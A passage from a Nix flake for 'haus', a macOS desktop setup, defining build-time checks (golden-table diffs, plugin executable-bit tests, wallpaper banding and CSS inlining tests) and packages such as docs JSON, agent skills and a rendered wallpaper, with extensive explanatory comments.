          keymap = pkgs.runCommand "haus-keymap-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedKeymapTable} \
                    ${pkgs.writeText "actual" (keymapTable + "\n")}
            touch $out
          '';

          alert-volume = pkgs.runCommand "haus-alert-volume-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedAlertVolumeTable} \
                    ${pkgs.writeText "actual" (alertVolumeTable + "\n")}
            touch $out
          '';

          accessibility-surface = pkgs.runCommand "haus-accessibility-surface-ok" { } ''
            ${nixpkgs.lib.optionalString (a11yArmsMissing != [ ]) ''
              cat >&2 <<'GONE'
              modules/core/haus.sh's classify_key no longer has a line matching:

              ${builtins.concatStringsSep "\n              " (map (c: ''") echo ${c} ;;"'') a11yArmsMissing)}

              so this check can't find the copy it exists to pin. Either restore that
              shape, or replace this check with whatever keeps classify_key's
              universalaccess arms in step with modules/lib/reachability.nix — do not
              simply delete it.
              GONE
              exit 1''}
            ${builtins.concatStringsSep "\n" (
              map (class: ''
                diff -u ${
                  pkgs.writeText "table-${class}" (builtins.concatStringsSep "\n" (a11yTableKeysOf class) + "\n")
                } \
                        ${
                          pkgs.writeText "classify_key-${class}" (
                            builtins.concatStringsSep "\n" (a11yShellKeysOf class) + "\n"
                          )
                        } \
                  || { echo >&2; echo "left: modules/lib/reachability.nix's \`${class}\` keys · right: classify_key's \`${class}\` arm in modules/core/haus.sh" >&2; exit 1; }
              '') a11yClasses
            )}
            touch $out
          '';

          theme-variants = pkgs.runCommand "haus-theme-variants-ok" { } ''
            ${nixpkgs.lib.optionalString (
              !staleLockThrows
            ) "echo 'a missing palette variant did not throw' >&2; exit 1"}
            diff -u ${pkgs.writeText "expected" expectedVariantTable} \
                    ${pkgs.writeText "actual" (variantTable + "\n")}
            touch $out
          '';

          # ---- site-data-current ----------------------------------------------
          # `docs/site-data/` is a COMMITTED copy of the `site-data` derivation —
          # the rice's option surface and binding table as plain JSON, so the
          # docs site can read them out of a checkout instead of running Nix.
          # A committed copy of generated data is a lie waiting to happen, so
          # this is the pin: the same shape as the golden tables above, and the
          # same reason.
          #
          # 🚨 It only runs when it is BUILT — the diff is in the builder, so
          # `nix flake check --no-build` passes it vacuously. Unlike scale-reach
          # and font-reach, which share that property and are ALSO darwin-gated,
          # this one is in the all-systems set and does run on CI's Linux
          # runner. Locally: `nix build .#checks.aarch64-darwin.site-data-current`.
          #
          # `diff -r` rather than a hardcoded list of filenames, because the
          # question is whether the two DIRECTORIES agree: a file added to the
          # derivation and never committed, or one committed and later dropped
          # upstream, is exactly the drift a per-file loop reports as green.
          # README.md is the one hand-written thing in there, hence the -x.
          #
          # When this goes red the fix is mechanical and never prose: nothing in
          # docs/site-data/ is hand-written, so regenerate and commit.
          # ---- userstyles-inline -----------------------------------------------
          # The pass that gets code blocks themed: `@import` is invalid inside
          # `@-moz-document` WHEREVER it points, so the file has to be pasted in
          # rather than pointed at. Two halves worth pinning — that a known URL
          # is replaced by its contents, and that an unknown one is FATAL. The
          # second is the one that matters: the failure it replaces was a style
          # that installed fine and rendered its code blocks stock, and a
          # silently-skipped import puts that back invisibly.
          userstyles-inline =
            pkgs.runCommand "haus-userstyles-inline-ok" { nativeBuildInputs = [ pkgs.python3 ]; }
              ''
                map=${
                  pkgs.writeText "map.json" (
                    builtins.toJSON {
                      "https://example.invalid/hl.css" = pkgs.writeText "hl.css" ".hljs { color: red; }";
                    }
                  )
                }

                python3 ${./modules/terminal/userstyles-inline.py} "$map" \
                  < ${pkgs.writeText "in.css" userstylesInlineIn} > actual.css
                diff -u ${pkgs.writeText "expected.css" userstylesInlineOut} actual.css

                # An import with no vendored copy must stop the build, not pass through.
                if python3 ${./modules/terminal/userstyles-inline.py} \
                     ${pkgs.writeText "empty.json" "{}"} \
                     < ${pkgs.writeText "in.css" userstylesInlineIn} > /dev/null 2> err.txt; then
                  echo "userstyles-inline accepted an unvendored @import" >&2
                  exit 1
                fi
                grep -q "example.invalid/hl.css" err.txt

                touch $out
              '';

          # ---- userstyles-important --------------------------------------------
          # The pass that makes `haus.zen.userStyles` render at all: a user
          # sheet's normal declarations lose to the page's own, so every
          # declaration has to leave the build as `!important`. Pinned here
          # because the interesting half is where it must NOT stamp —
          # `!important` inside `@keyframes` or a descriptor block is invalid,
          # and an invalid declaration is DROPPED, so over-stamping deletes
          # styling rather than strengthening it. The fixture carries one of
          # each, including the two shapes that fool a naive `;`-splitter: a `;`
          # inside a string, and one inside an unquoted `url()`.
          userstyles-important =
            pkgs.runCommand "haus-userstyles-important-ok" { nativeBuildInputs = [ pkgs.python3 ]; }
              ''
                python3 ${./modules/terminal/userstyles-important.py} \
                  < ${pkgs.writeText "in.css" userstylesImportantIn} > actual.css
                diff -u ${pkgs.writeText "expected.css" userstylesImportantOut} actual.css
                touch $out
              '';

          site-data-current = pkgs.runCommand "haus-site-data-current-ok" { } ''
            if ! diff -ru -x README.md \
                 ${./docs/site-data} ${self.packages.${system}.site-data}; then
              cat >&2 <<'STALE'

            docs/site-data/ has drifted from the module system.

            Nothing in that directory is hand-written — it is `nix build .#site-data`
            committed, so the docs site can read it without Nix. Regenerate it from
            the repo root and commit the result:

                out=$(nix build --no-link --print-out-paths .#site-data)
                install -m644 "$out"/*.json docs/site-data/

            STALE
              exit 1
            fi
            touch $out
          '';

          # 🚨 The agent skill is the one flake output whose failure takes a
          # machine's whole rebuild with it, and until 2026-08-16 nothing here
          # built it. `haus.ai.skill` installs it as a home-manager file, so a
          # red `.#agent-skill` fails `home-manager-files`, then
          # `activation-<user>`, then the darwin system — every `haus rebuild`
          # on every machine, from a derivation `nix flake check` never touched.
          #
          # That is exactly how it happened: haus#376 extended one room's
          # `agent.cli`, the renderer's own end-anchored guard rejected the
          # longer string, CI went green because no check built the package, and
          # the breakage surfaced only when a machine tried to rebuild against
          # the new pin. haus#379 fixed the guard; this is what would have caught
          # it in the PR.
          #
          # Building it IS the check — `skill.nix`'s builder carries the render
          # assertions. The extra lines below are the shape a rebuild depends on:
          # the six files terminal actually installs, each non-empty, so a
          # renderer that silently produced nothing fails here rather than
          # landing an empty skill on someone's machine.
          # Same hazard as `.#agent-skill` below, one repo boundary further out:
          # modules/ai turns each of these into a home file, so a listed skill
          # name the pinned tool revision doesn't ship fails `home-manager-files`
          # and takes the whole `haus rebuild` with it. Building it IS the check
          # — the derivation's own guard is what fails — and the loop below is
          # the shape a rebuild depends on: every skill present and non-empty.
          #
          # It replaces a gap rather than a break: before this, the same wrong
          # name was green all the way down and landed a dangling symlink in
          # ~/.claude/skills instead. Loud in CI beats quiet in someone's home.
          tool-skills = pkgs.runCommand "haus-tool-skills-ok" { } ''
            skills=${self.packages.${system}.tool-skills}
            found=0
            for d in "$skills"/*; do
              test -s "$d/SKILL.md" \
                || { echo "tool skill is missing or empty: $(basename "$d")" >&2; exit 1; }
              found=$((found + 1))
            done
            test "$found" -gt 0 \
              || { echo "tool-skills built nothing at all" >&2; exit 1; }
            touch $out
          '';

          agent-skill = pkgs.runCommand "haus-agent-skill-ok" { } ''
            skill=${self.packages.${system}.agent-skill}
            for f in SKILL.md consumer-AGENTS.md consumer-CLAUDE.md \
                     references/options.md references/rooms.md \
                     references/recipes.md; do
              test -s "$skill/$f" \
                || { echo "agent skill is missing or empty: $f" >&2; exit 1; }
            done
            touch $out
          '';

          # SketchyBar executes each rc directly. When an rc is not executable it
          # tries to chmod it first; Home Manager's source link resolves into the
          # immutable Nix store, so that chmod fails and the bar starts empty.
          # The original top rc carried +x, while the newer second-bar rc did not
          # and therefore passed every evaluation/build check but never populated
          # the live process. Pin both source modes before another rc ships with
          # the same silent startup failure.
          bar-rc-executable = pkgs.runCommand "haus-bar-rc-executable-ok" { } ''
            test -x ${./modules/bar/sketchybar/sketchybarrc}
            test -x ${./modules/bar/sketchybar/bar-bottomrc}
            touch $out
          '';

          # The same trap, one directory down, and it bites harder there. A
          # plugin is named in a `script=` or a `click_script=`, which SketchyBar
          # runs through the shell — so a source file committed 0644 lands in the
          # store as r--r--r--, every invocation exits 126, and the ONLY symptom
          # is a pill that never draws and never logs. It survives evaluation,
          # the build, and `nix flake check` as it stood; the github pill shipped
          # exactly that way and was caught by hand.
          #
          # Some plugins are LIBRARIES — sourced by their siblings, never exec'd
          # — and are legitimately 0644, so they are named rather than pattern-
          # matched: a new library adds a name to `libs` below, which is the
          # moment to be sure it really is one. (Counted "two" while there were
          # three; say "some" rather than re-count it wrong at the next one.)
          bar-plugins-executable = pkgs.runCommand "haus-bar-plugins-executable-ok" { } ''
            libs="aerospace_lib.sh ai-provider.sh media_lib.sh vitals_lib.sh"
            bad=
            for f in ${./modules/bar/sketchybar/plugins}/*.sh; do
              base=$(basename "$f")
              case " $libs " in *" $base "*) continue ;; esac
              test -x "$f" || bad="$bad $base"
            done
            if [ -n "$bad" ]; then
              echo "not executable, so SketchyBar can only fail with exit 126:$bad" >&2
              echo "fix: git update-index --chmod=+x modules/bar/sketchybar/plugins/<name>" >&2
              exit 1
            fi
            touch $out
          '';

          # ---- wallpaper --------------------------------------------------
          # Renders the `minimal` desktop and asserts the two things about it
          # that nobody would notice going wrong.
          #
          # GEOMETRY, because macOS rescales anything that isn't the panel's own
          # pixel count and rescaling is where a clean gradient starts to look
          # stepped — so the picture has to come out at exactly the size the
          # option asked for, not merely near it.
          #
          # COLOUR COUNT, because that is what banding IS. The bloom spends
          # about ten of the 256 levels an 8-bit PNG has; quantised without the
          # grain that dithers it the picture draws visible contour rings.
          #
          # The whole ladder, measured at the shipped defaults rather than
          # guessed, because the floor is only defensible against real numbers:
          # `grain = 0` gives 137 distinct colours, 0.004 (the lowest value the
          # option calls useful) gives 193, the default 0.01 gives 329, and 0.02
          # gives 625. So 160 — above the ungrained case, below the lowest
          # grain anyone should ship. If this ever fails, the dither stopped
          # reaching the reduction; it does NOT fail on a retune of taste.
          #
          # It renders the DEFAULTS and only the defaults. Drop the default
          # grain below ~0.003 and this stops being a meaningful floor — move it
          # then, with fresh numbers, rather than deleting it. `depth` moves them
          # too, a little, since a darker field clips more of the noise: the four
          # above were re-measured when the default depth went to 1.
          #
          # 🚨 Like site-data-current, it only runs when it is BUILT.
          wallpaper = pkgs.runCommand "haus-wallpaper-ok" { nativeBuildInputs = [ pkgs.imagemagick ]; } ''
            pic=${self.packages.${system}.wallpaper}
            geom=$(magick identify -format '%wx%h' "$pic")
            [ "$geom" = "3456x2234" ] \
              || { echo "wallpaper rendered $geom, expected the option's 3456x2234" >&2; exit 1; }
            colours=$(magick identify -format '%k' "$pic")
            [ "$colours" -gt 160 ] \
              || { echo "wallpaper has only $colours distinct colours — the grain that dithers the bloom is not reaching the 8-bit reduction, so it will band" >&2; exit 1; }
            touch $out
          '';

          # `haus show`'s reading of every desktop fixture. Up here rather than
          # beside `desktop-seam` because it is pure lib over files: the seam's
          # half needs a real evaluated machine and is darwin-only, and this half
          # is the one a publisher's Linux CI runs, so it belongs where CI can
          # reach it.
          desktop-show = pkgs.runCommand "haus-desktop-show-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedDesktopShowTable} \
                    ${pkgs.writeText "actual" (desktopShowTable + "\n")}

            diff -u ${pkgs.writeText "expected" expectedDesktopShowSample} \
                    ${pkgs.writeText "actual" (desktopShowSample + "\n")}
            touch $out
          '';
          namespace-guard = pkgs.runCommand "haus-namespace-guard-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedNamespaceGuardTable} \
                    ${pkgs.writeText "actual" (namespaceGuardTable + "\n")}

            diff -u ${pkgs.writeText "expected" expectedNamespaceGuardWarnings} \
                    ${pkgs.writeText "actual" (builtins.concatStringsSep "\n" namespaceGuardWarnings + "\n")}

            diff -u ${pkgs.writeText "expected" expectedNamespaceGuardWarningsClaimed} \
                    ${pkgs.writeText "actual" (
                      builtins.concatStringsSep "\n" namespaceGuardWarningsClaimed + "\n"
                    )}

            diff -u ${pkgs.writeText "expected" expectedNamespaceGuardAssertTable} \
                    ${pkgs.writeText "actual" (namespaceGuardAssertTable + "\n")}
            touch $out
          '';
        }
        // nixpkgs.lib.optionalAttrs (nixpkgs.lib.hasSuffix "-darwin" system) {
          app-collections = pkgs.runCommand "haus-app-collections-ok" { } ''
            ${nixpkgs.lib.optionalString (collectionFailures != [ ]) ''
              cat >&2 <<'FAILURES'
              ${builtins.concatStringsSep "\n\n" collectionFailures}
              FAILURES
              exit 1''}
            touch $out
          '';

          standalone-modules = pkgs.runCommand "haus-standalone-modules-ok" { } ''
            cat > $out <<'MODULES'
            ${builtins.concatStringsSep "\n" standaloneEvaluated}
            MODULES
            # The second table is the one with a claim in it: every export must
            # also evaluate with NO `hostname` specialArg. Both lists are forced
            # by being interpolated, so a module that made `hostname` mandatory
            # fails this derivation at eval rather than in a consumer's flake.
            cat >> $out <<'NOHOSTNAME'
            ${builtins.concatStringsSep "\n" standaloneNoHostname}
            NOHOSTNAME
          '';

          desktop-seam = pkgs.runCommand "haus-desktop-seam-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedDesktopTable} \
                    ${pkgs.writeText "actual" (desktopTable + "\n")}

            ${nixpkgs.lib.optionalString (desktopStandalone != "(none)") ''
              echo 'a standalone darwinModules import selected a desktop (${desktopStandalone}) — those exports are the bare foundation plus one room and must need no desktop selection' >&2
              exit 1''}

            diff -u ${
              pkgs.writeText "expected" (builtins.concatStringsSep "\n" expectedDesktopTwoAssertions + "\n")
            } \
                    ${pkgs.writeText "actual" (builtins.concatStringsSep "\n" desktopTwoAssertions + "\n")}

            diff -u ${
              pkgs.writeText "expected" (builtins.concatStringsSep "\n" expectedDesktopSameAssertions + "\n")
            } \
                    ${pkgs.writeText "actual" (builtins.concatStringsSep "\n" desktopSameAssertions + "\n")}

            diff -u ${pkgs.writeText "expected" expectedDesktopDiagnostics} \
                    ${pkgs.writeText "actual" (desktopDiagnostics + "\n")}

            ${nixpkgs.lib.optionalString (desktopSlippedThrough != [ ]) ''
              echo 'checkDesktop accepted a file that is not a desktop: ${builtins.concatStringsSep ", " desktopSlippedThrough}' >&2
              exit 1''}
            ${nixpkgs.lib.optionalString (desktopWronglyRefused != [ ]) ''
              echo 'checkDesktop refused a valid desktop: ${builtins.concatStringsSep ", " desktopWronglyRefused}' >&2
              exit 1''}
            ${nixpkgs.lib.optionalString (blankSelections != [ ]) ''
              echo 'Blank selected optional rooms: ${builtins.concatStringsSep ", " blankSelections}' >&2
              exit 1''}
            touch $out
          '';

          fragment-compat = pkgs.runCommand "haus-fragment-compat-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedFragmentCompatTable} \
                    ${pkgs.writeText "actual" (fragmentCompatTable + "\n")}
            touch $out
          '';

          editor-choice = pkgs.runCommand "haus-editor-choice-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedEditorTable} \
                    ${pkgs.writeText "actual" (editorTable + "\n")}
            touch $out
          '';

          settings-writes = pkgs.runCommand "haus-settings-writes-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedSettingsWriteTable} \
                    ${pkgs.writeText "actual" (settingsWriteTable + "\n")}
            touch $out
          '';

          desktop-projection =
            pkgs.runCommand "haus-desktop-projection-ok" { nativeBuildInputs = [ pkgs.jq ]; }
              ''
                jq -S . ${./test/projections/example.json} > expected.json
                jq -S . ${pkgs.writeText "actual-projection.json" exampleProjection} > actual.json
                diff -u expected.json actual.json
                touch $out
              '';

          ai-room = pkgs.runCommand "haus-ai-room-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedAiRoomTable} \
                    ${pkgs.writeText "actual" (aiRoomTable + "\n")}


            diff -u ${
              pkgs.writeText "expected" (builtins.concatStringsSep "\n" expectedAiPillWarnings + "\n")
            } \
                    ${pkgs.writeText "actual" (builtins.concatStringsSep "\n" aiPillWarnings + "\n")}

            diff -u ${
              pkgs.writeText "expected" (builtins.concatStringsSep "\n" expectedAiBottomPillWarnings + "\n")
            } \
                    ${pkgs.writeText "actual" (builtins.concatStringsSep "\n" aiBottomPillWarnings + "\n")}
            touch $out
          '';

          accent-reach = pkgs.runCommand "haus-accent-reach-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedAccentTable}                     ${
              pkgs.writeText "actual" (accentTable + "
")
            }
            touch $out
          '';

          font-reach = pkgs.runCommand "haus-font-reach-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedFontTable} \
                    ${pkgs.writeText "actual" (fontTable + "\n")}
            touch $out
          '';

          scale-reach = pkgs.runCommand "haus-scale-reach-ok" { } ''
            diff -u ${pkgs.writeText "expected" expectedScaleTable} \
                    ${pkgs.writeText "actual" (scaleTable + "\n")}
            touch $out
          '';

          login-note = pkgs.runCommand "haus-login-note-ok" { } ''
            ${nixpkgs.lib.optionalString (loginNoteOptions == [ ]) ''
              cat >&2 <<'GONE'
              login-note found NO options under the namespaces it is meant to check
              (haus.lock.login, haus.security.guestAccount, haus.windows.stageManager
              / .nativeTiling / .desktop).

              Either those groups were removed — in which case delete this check and
              the `logout` entries in modules/lib/restart-map.nix together — or the
              walk over the option tree stopped working, in which case this check has
              been passing on an empty set. Do not simply delete it.
              GONE
              exit 1''}
            ${nixpkgs.lib.optionalString (loginNoteMissing != [ ]) ''
              cat >&2 <<'MISSING'
              These options write a logout-only plist domain but their descriptions
              never say so:

              ${builtins.concatStringsSep "\n              " loginNoteMissing}

              A setting that lands in the plist and changes nothing until the next
              login, with nothing at the option to say it, is the exact failure §5.6
              refused these groups over — "a group that silently needs a logout is
              worse than no group". The fix is not to write the sentence again: build
              the option through `mkLoginWindow` (modules/core/options.nix) or
              `mkWindowManagerOption` (modules/windows/options.nix), both of which
              stamp it from modules/lib/login-map.nix, which in turn reads the
              `logout` verb out of modules/lib/restart-map.nix. One fact, one place.
              MISSING
              exit 1''}
            touch $out
          '';

          bar-bottom-focus =
            let
              cfg =
                (mkHaus {
                  inherit system;
                  username = "you";
                  hostname = "example";
                  extraModules = [
                    {
                      haus.focus.enable = true;
                      haus.bar.bottom = {
                        enable = true;
                        items.focus = true;
                      };
                    }
                  ];
                }).config.home-manager.users.you;
              top = pkgs.writeText "top_items.sh" cfg.home.file.".config/sketchybar/top_items.sh".text;
              bottom = pkgs.writeText "bottom_items.sh" cfg.home.file.".config/sketchybar/bottom_items.sh".text;
              routing = pkgs.writeText "bar.sh" cfg.home.file.".config/sketchybar/bar.sh".text;
            in
            pkgs.runCommand "haus-bar-bottom-focus-ok" { } ''
              if grep -q -- '--add item focus' ${top}; then
                echo 'focus was duplicated on the top bar after moving to bottom.items' >&2
                exit 1
              fi
              grep -q -- '\$SB --add item focus' ${bottom}
              grep -q 'BAR_BOTTOM_ITEMS="[^"]*focus' ${routing}
              touch $out
            '';

          # The bottom bar's three groups. A pill's side reaches SketchyBar as
          # the `--add item <name> <side>` argument and NOTHING else reports it,
          # so a block that lost its side parameter would still evaluate, still
          # build, and quietly pile every pill back on the right — invisible
          # until someone looks at the live bar. Hence a check that reads the
          # generated file.
          #
          # `clock = true` is here on purpose: this option shipped bool-only, so
          # the bool has to keep meaning the right group.
          bar-bottom-groups =
            let
              mkBottom =
                items:
                (mkHaus {
                  inherit system;
                  username = "you";
                  hostname = "example";
                  extraModules = [
                    {
                      haus.bar.bottom = {
                        enable = true;
                        inherit items;
                      };
                    }
                  ];
                }).config.home-manager.users.you;

              spread = mkBottom {
                agents = "left";
                calendar = "center";
                clock = true;
              };
              top = pkgs.writeText "top_items.sh" spread.home.file.".config/sketchybar/top_items.sh".text;
              bottom =
                pkgs.writeText "bottom_items.sh"
                  spread.home.file.".config/sketchybar/bottom_items.sh".text;

              # Every movable pill on ONE side. Whatever this file says next to
              # `--add item`, all of it has to be `left` — which is the check no
              # named-pill grep can make: a block that dropped its side argument
              # and kept a literal `right` passes the fixture above (some other
              # pill is genuinely on the right) and fails here.
              allLeft = mkBottom (
                nixpkgs.lib.genAttrs [
                  "clock"
                  "weather"
                  "media"
                  "battery"
                  "wifi"
                  "cpu"
                  "memory"
                  "volume"
                  "calendar"
                  "caffeinate"
                  "agents"
                  "aiUsage"
                  "elgato"
                  "harvest"
                ] (_: "left")
              );
              left = pkgs.writeText "bottom_items.sh" allLeft.home.file.".config/sketchybar/bottom_items.sh".text;
            in
            pkgs.runCommand "haus-bar-bottom-groups-ok" { } ''
              grep -q -- '\$SB --add item agents left' ${bottom}
              grep -q -- '\$SB --add item calendar center' ${bottom}
              grep -q -- '\$SB --add item clock right' ${bottom}

              # A dropdown follows its pill, or it grows off the edge the pill is
              # now sitting against. agents is on the left, calendar the center.
              grep -q -- 'popup.align=left' ${bottom}
              grep -q -- 'popup.align=center' ${bottom}

              # Groups are emitted left, then center, then right.
              at() { grep -n -- "$1" ${bottom} | head -1 | cut -d: -f1; }
              l=$(at '--add item agents left')
              c=$(at '--add item calendar center')
              r=$(at '--add item clock right')
              if [ "$l" -ge "$c" ] || [ "$c" -ge "$r" ]; then
                echo "bottom bar groups are out of order (left=$l center=$c right=$r)" >&2
                exit 1
              fi

              # No pill block hardcodes a side. `popup.<parent>` is the position
              # of a dropdown ROW and is not a group, so it is allowed through.
              stray=$(grep -o -- '--add item [a-z_.0-9]* [a-z]*' ${left} \
                | grep -v ' left$' | grep -v ' popup$' || true)
              if [ -n "$stray" ]; then
                echo 'a bottom-bar pill ignored its group and hardcoded a side:' >&2
                echo "$stray" >&2
                exit 1
              fi

              # And a pill named down there is still gone from the menu bar.
              if grep -q -- '--add item clock' ${top}; then
                echo 'clock was duplicated on the top bar after moving to a bottom group' >&2
                exit 1
              fi
              touch $out
            '';

          catalogue = pkgs.runCommand "haus-catalogue-ok" { } ''
            cat > $out <<'CATALOGUE'
            ${builtins.concatStringsSep "\n" evaluated}
            CATALOGUE
          '';
        }
      );

      # `nix run github:hausfold/haus#pounce`
      # Linux is in allSystems because three of these build there and want to:
      # options-json, which hausfold.co's CI renders the options reference from,
      # and `desktop-check` / `show`, whose whole audience is a publisher's CI
      # runner. The rest of the set is darwin's; nothing here is a Mac except
      # the things that have to be.
      packages = nixpkgs.lib.genAttrs allSystems (
        system:
        let
          pkgs = nixpkgs.legacyPackages.${system};
          isDarwin = nixpkgs.lib.hasSuffix "-darwin" system;

          # Bound once: two outputs below ship it, and `haus show` is only
          # honest if both hand the script the SAME rules.
          desktopCheck = import ./modules/desktop-check.nix { inherit pkgs; };
        in
        {
          # `nix build .#wm-bindings-json` — the static tiling/workspace/service
          # binding table as JSON, resolved for the DEFAULT keymap.
          #
          # Exists for the docs repo's keybinding tripwire. That script used to
          # `nix eval --json --file modules/windows/wm-bindings.nix`, which worked
          # only while that file was plain data; the keys.* change made it a
          # function of haus.keys.*, so the eval started failing with
          # "cannot convert a function to JSON" — a regression in ANOTHER repo, on
          # a weekly cron, with nothing here to catch it.
          #
          # An output is the right seam regardless: the docs already render
          # options.md from `options-json` rather than reading module files, for
          # the same reason. Downstream shouldn't have to know how the table is
          # constructed, only what it resolves to.
          #
          # Pure evaluation of two plain files, so it builds on Linux CI.
          wm-bindings-json =
            let
              # The SHIPPED defaults, not a host's. The tripwire's question is
              # "did the default binding surface move", which is what the prose
              # keybinding pages document.
              k = import ./modules/lib/keys.nix {
                inherit (pkgs) lib;
                keys = {
                  leader = "caps";
                  palette = "cmd-space";
                  windowNav = "alt";
                };
              };
            in
            pkgs.writeText "wm-bindings.json" (
              builtins.toJSON (
                import ./modules/windows/wm-bindings.nix {
                  inherit (pkgs) lib;
                  inherit k;
                  # Nothing else to pass: this table is window keys and
                  # nothing but. It carried one per-machine contribution — the
                  # agent-spawn chord, back when it was AeroSpace's ⌃⌘A — and
                  # that left the room on 2026-08-18 for pounce's
                  # Ghostty-scoped ⌘↵.
                  #
                  # `mouseFullscreen` is passed by neither, and by its own
                  # default rather than by omission ("none", so the row is
                  # absent): the pointer chord is a DESKTOP's choice — hacker
                  # takes it — not something a bare haus binds, which is the
                  # honest answer to "what does a default install bind". Its
                  # prose page is hand-written, so nothing depends on this
                  # tripwire seeing it.
                }
              )
            );

          # `nix build .#launch-keys-json` — the launch-mode keys the leader
          # owns before any roster letter, resolved for the DEFAULT number of
          # numbered workspaces.
          #
          # Second half of the tripwire above, and it exists because the first
          # half stopped covering it. Launch mode's digit rows were literal
          # lines in modules/windows/aerospace.toml, so the docs repo read them by
          # parsing that file; haus.windows.numberedWorkspaces turned them into a
          # generated block, and a parser looking for `1 = [...]` found a token
          # and reported no change. Published rather than parsed, for the same
          # reason the option reference is rendered rather than written.
          #
          # Pure evaluation of one plain file, so it builds on Linux CI.
          launch-keys-json =
            let
              # The SHIPPED default count, read off the option rather than
              # retyped — a literal 4 here would be a second copy of
              # modules/windows/options.nix's default, and the copy that goes
              # stale is the one nothing evaluates. An options-only module
              # evaluates on its own, which is the same purity that lets the
              # option reference be rendered at all.
              default =
                (pkgs.lib.evalModules { modules = [ ./modules/windows/options.nix ]; })
                .config.haus.windows.numberedWorkspaces;
            in
            pkgs.writeText "launch-keys.json" (
              builtins.toJSON (
                import ./modules/windows/launch-keys.nix {
                  inherit (pkgs) lib;
                  numbered = import ./modules/lib/numbered.nix { inherit (pkgs) lib; } default;
                }
              )
            );

          # `nix build .#options-json` — machine-readable metadata for every
          # haus.* option: type, default, example, description, and the
          # file that declares it. hausfold.co's options reference is
          # RENDERED from this instead of hand-maintained, so the page cannot
          # drift from the module system (as prose, it drifted for months).
          options-json = import ./modules/options-doc.nix { inherit pkgs; };

          # `nix build .#site-data` — the outputs above, filtered and
          # pretty-printed into plain JSON files a docs site can read with
          # NO Nix at all. `docs/site-data/` is the committed copy of this, and
          # the `site-data-current` check is what keeps the two equal.
          #
          # It exists so the site repo's CI doesn't need Nix, a flake pin and a
          # nixpkgs fetch to check its own reference page — see
          # modules/site-data.nix.
          site-data = import ./modules/site-data.nix {
            inherit pkgs;
            optionsJson = self.packages.${system}.options-json;
            wmBindingsJson = self.packages.${system}.wm-bindings-json;
            launchKeysJson = self.packages.${system}.launch-keys-json;
          };

          # `nix build .#tool-skills` — the OTHER hausfold tools' agent skills,
          # copied through one derivation that fails if a listed name isn't
          # there. modules/ai installs the result as home files, so this is on
          # every machine's rebuild path and belongs in `checks` for the reason
          # spelled out above `.#agent-skill`.
          #
          # `holt-skill` comes off the flake input rather than off `pkgs`: the
          # `pkgs` here is a bare `legacyPackages` with no overlays applied,
          # while the room reads the same derivation through holt's overlay.
          tool-skills =
            (import ./modules/ai/tool-skills.nix {
              inherit pkgs;
              inherit (nixpkgs) lib;
              holt-skill = holt.packages.${system}.holt-skill;
            }).checked;

          # `nix build .#agent-skill` — the skill that teaches an agent to change
          # THIS machine's config: the edit → `haus rebuild` → `haus rollback`
          # loop, the boundaries, and an option reference rendered from the same
          # metadata as above.
          #
          # A package rather than a checked-in file on purpose: built from the
          # revision a machine has actually pinned, it can only ever describe
          # the options that exist there. terminal installs it into every client's
          # own skills directory (haus.ai.skill), so `haus update` updates
          # the agent's knowledge along with the rice.
          #
          # Was `.#claude-skill` until 2026-08-11, when the skill stopped being
          # Claude Code's alone. Not aliased: a flake output is named in a
          # command someone types, not pinned in a config that would silently
          # break, and `nix build .#` lists the new one.
          agent-skill = import ./modules/ai/agents/skill.nix { inherit pkgs; };

          # `nix build .#host-template` — the annotated host file a fresh
          # install is scaffolded with: every haus.* option at its default,
          # described, docs-linked, and commented out (see host-template.nix for
          # why commented). Two consumers, both needing it built from a SPECIFIC
          # revision rather than committed: bootstrap.sh, on a Mac that has no
          # haus yet, and `haus options` on one that does — core installs it
          # into the system profile so that second path costs nothing.
          host-template = import ./modules/host-template.nix { inherit pkgs; };

          # `nix build .#desktop-check` — the desktop rules as a directory
          # `nix eval` can read, plus the `haus show` script beside them. core
          # installs it into the system profile; this output is what a publisher
          # with no haus install can still reach.
          desktop-check = desktopCheck;

          # `nix run github:hausfold/haus#show -- ./writer.nix` — the pre-share
          # check, for the one audience that is NOT on a haus machine: a
          # publisher's CI, gating on the exit code before a desktop goes out.
          # Since step B it also takes a SOURCE (`github:ada/writer-desktop`),
          # which is the consumer's half of the same command.
          #
          # It is the same script `haus show` execs, with the same evaluator
          # baked in, which is the point — a checker a publisher runs and a
          # checker their reader runs have to be the same one, or "it passed for
          # me" is the whole bug report. Every system, not just darwin: nothing
          # in the desktop rules is a Mac, and a publisher's runner is Linux.
          show = pkgs.writeShellScriptBin "haus-show" ''
            export PATH="$PATH:${nixpkgs.lib.makeBinPath [ pkgs.jq ]}"
            export HAUS_DESKTOP_CHECK="''${HAUS_DESKTOP_CHECK:-${desktopCheck}/share/haus/desktop-check}"
            exec ${pkgs.bash}/bin/bash ${./modules/core/haus-show.sh} "$@"
          '';

          # `nix build .#wallpaper` — the generated `minimal` desktop at the
          # shipped defaults, as a PNG you can open.
          #
          # A wallpaper is the one rice surface you cannot review by reading a
          # diff, and until this existed the only way to see one was to rebuild a
          # Mac and look at it. Now the same ./modules/wallpaper/render.nix a
          # real machine uses is handed the option DEFAULTS instead of a host's
          # values, so what this builds is exactly what someone gets on a machine
          # that says nothing about its desktop at all. `--override-input` or a
          # checkout is how you preview a change to it.
          #
          # The defaults come from evalModules over the same options list every
          # other renderer reads (see ./modules/options-modules.nix), so this
          # can't quietly fall behind a retuned default. `style` is pinned below
          # rather than read: it is the shipped default now, so the pin is a
          # no-op — but it is what keeps this package rendering `minimal` if the
          # default ever moves again, since there is nothing to build from any of
          # the other five.
          wallpaper =
            let
              surface =
                (nixpkgs.lib.evalModules {
                  specialArgs.lib = nixpkgs.lib;
                  modules = (import ./modules/options-modules.nix) ++ [ { _module.check = false; } ];
                }).config.haus;
            in
            import ./modules/wallpaper/render.nix {
              inherit pkgs inputs;
              lib = nixpkgs.lib;
              nebelung = { inherit (nebelung) palettes; };
              inherit (surface)
                theme
                ui
                bar
                fonts
                ;
              cfg = surface.wallpaper // {
